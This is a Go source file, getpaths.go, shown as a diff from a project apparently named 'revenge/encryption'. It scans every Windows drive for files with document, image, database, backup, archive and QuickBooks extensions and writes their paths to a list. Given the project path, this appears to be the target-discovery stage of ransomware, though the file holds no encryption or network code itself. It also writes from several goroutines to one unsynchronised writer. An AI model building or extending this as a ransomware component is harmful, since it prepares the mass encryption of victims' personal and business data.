@@ -1,0 +1,66 @@
+file:///home/ty/go/src/revenge/encryption/getpaths.go {"mtime":1684293313935,"ctime":1684293313935,"size":1619,"etag":"3aigskq9p1l7","orphaned":false,"typeId":""}
+package main
+
+import (
+	"bufio"
+	"log"
+	"os"
+	"path/filepath"
+	"strings"
+	"sync"
+)
+
+func main() {
+	fileExtensions := map[string]struct{}{
+		".txt": {}, ".doc": {}, ".docx": {}, ".xls": {}, ".xlsx": {}, ".ppt": {}, ".pptx": {},
+		".pdf": {}, ".jpg": {}, ".jpeg": {}, ".png": {}, ".gif": {}, ".bmp": {}, ".tiff": {},
+		".csv": {}, ".rtf": {}, ".xml": {}, ".html": {}, ".dmp": {}, ".sql": {}, ".exe": {},
+		".bat": {}, ".ini": {}, ".log": {}, ".reg": {}, ".msi": {}, ".bak": {}, ".db": {},
+		".backup": {},
+		".tmp": {}, ".iso": {}, ".zip": {}, ".rar": {}, ".7z": {}, ".mp3": {}, ".wav": {},
+		".mp4": {}, ".qbo": {}, ".qbb": {}, ".qbw": {},
+	}
+
+	f, err := os.Create("filePaths.txt")
+	if err != nil {
+		log.Fatalf("Failed to create file: %v", err)
+	}
+	defer f.Close()
+
+	writer := bufio.NewWriter(f)
+	defer writer.Flush()
+
+	var wg sync.WaitGroup
+
+	drives := "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+	for _, drive := range drives {
+		fpath := string(drive) + ":\\"
+		if _, err := os.Stat(fpath); !os.IsNotExist(err) {
+			wg.Add(1)
+			go func(path string) {
+				defer wg.Done()
+				filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
+					if err != nil {
+						log.Printf("Prevent panic by handling failure accessing a path %q: %v\n", path, err)
+						return err
+					}
+
+					if !info.IsDir() {
+						ext := strings.ToLower(filepath.Ext(path))
+						if _, ok := fileExtensions[ext]; ok {
+							_, err = writer.WriteString(path + "\n")
+							if err != nil {
+								log.Printf("Error writing to file: %v\n", err)
+								return err
+							}
+						}
+					}
+					return nil
+				})
+			}(fpath)
+		}
+	}
+
+	wg.Wait()
+}
+
